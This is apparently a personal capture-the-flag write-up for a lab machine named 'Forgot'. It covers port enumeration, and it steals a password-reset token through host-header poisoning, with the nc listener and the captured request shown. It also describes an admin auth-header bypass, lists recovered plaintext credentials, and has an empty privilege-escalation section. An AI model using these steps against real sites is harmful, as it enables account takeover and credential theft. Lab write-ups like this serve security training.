# Forgot

---

## Enumeration

- nmap:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Werkzeug/2.1.2 Python/3.8.10
```

- Forgot password poisoning: https://book.hacktricks.xyz/pentesting-web/reset-password, https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning

- username: 'robert-dev-14329' in source:

```zsh
curl $IP | grep by
```

- To steal the reset password token, I started nc listener and intercepted the request, changed the host to myIP:9000

```zsh
nc -lvnp 9000
listening on [any] 9000 ...
connect to [10.10.16.23] from (UNKNOWN) [10.129.249.191] 34506
GET /reset?token=QzQ+7x4zUoJwaGJxYa6aAQdWG8pIlUmaneaCT/vmhYYzMG+oW5leRAkYD1qcbPI3gF6+/PbL6FzKZtCTYtDPJw== HTTP/1.1
Host: 10.10.16.23:9000
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

- Now head to /reset and rest the password using this token

---

## Foothold

- Found disabled link `/admin_tickets`, Had no access to it initially but changing the Auth header username to be admin with same password got me into this page

- found creds: `Diego:dCb#1!X0%Gjq` -> Diego:dCb#1!X0%Gjq.


---

## Privilege Escalation



---
